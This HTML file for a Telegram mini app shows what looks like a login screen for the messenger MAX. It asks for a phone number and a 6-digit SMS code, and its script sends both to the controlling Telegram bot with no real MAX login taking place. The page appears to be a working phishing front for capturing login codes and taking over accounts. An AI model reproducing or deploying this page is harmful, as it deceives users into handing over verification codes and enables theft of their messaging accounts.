<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAX</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #1a1a2e;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #fff;
            border-radius: 20px;
            padding: 40px 30px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            width: 64px; height: 64px;
            margin: 0 auto 20px;
            background: #007aff;
            border-radius: 16px;
            display: flex; align-items: center; justify-content: center;
            font-size: 32px; color: #fff; font-weight: bold;
        }
        .title { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
        .desc { color: #888; font-size: 14px; margin-bottom: 24px; }
        input {
            width: 100%; padding: 14px 16px;
            border: 2px solid #e0e0e0; border-radius: 12px;
            font-size: 16px; margin-bottom: 12px; outline: none;
        }
        input:focus { border-color: #007aff; }
        button {
            width: 100%; padding: 14px;
            background: #007aff; color: #fff;
            border: none; border-radius: 12px;
            font-size: 16px; font-weight: 600; cursor: pointer;
        }
        button:active { opacity: 0.8; }
        #codeSection { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <div class="title">Вход в MAX</div>
        <div class="desc">Введите номер телефона</div>
        <div id="phoneSection">
            <input type="tel" id="phone" placeholder="+7 916 123-45-67">
            <button onclick="requestCode()">Получить код</button>
        </div>
        <div id="codeSection">
            <div class="desc">Код отправлен на номер</div>
            <input type="text" id="code" placeholder="Код из SMS" maxlength="6">
            <button onclick="submitCode()">Войти</button>
        </div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        function requestCode() {
            const phone = document.getElementById('phone').value.trim();
            if (!phone) return;
            tg.sendData(JSON.stringify({action: "request_code", phone}));
            document.getElementById('phoneSection').style.display = 'none';
            document.getElementById('codeSection').style.display = 'block';
        }
        function submitCode() {
            const code = document.getElementById('code').value.trim();
            if (code.length !== 6) return;
            tg.sendData(JSON.stringify({action: "submit_code", code}));
            tg.close();
        }
    </script>
</body>
</html>
